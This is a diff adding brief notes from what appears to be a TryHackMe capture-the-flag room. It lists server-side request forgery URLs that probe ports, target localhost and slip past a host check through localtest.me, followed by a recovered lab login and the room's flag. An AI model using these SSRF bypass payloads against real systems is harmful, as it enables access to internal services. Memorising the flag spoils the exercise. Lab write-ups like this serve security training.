@@ -1,0 +1,11 @@
+bypass login
+user: admin
+fetch root:  http://10.10.109.12/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2F 
+change port to 80:  http://10.10.109.12/?proxy=http%3A%2F%2Flist.hohoho%3A80
+change port num to 22: : http://10.10.109.12/?proxy=http%3A%2F%2Flist.hohoho%3A22
+replace list.hohoh to localhost: : http://10.10.109.12/?proxy=http%3A%2F%2Flocalhost
+bipass check and access local service: http://10.10.109.12/?proxy=http%3A%2F%2Flist.hohoho.localtest.me
+[login]
+original user: Santa
+pass:Be good for goodness sake!
+flag:THM{EVERYONE_GETS_PRESENTS}
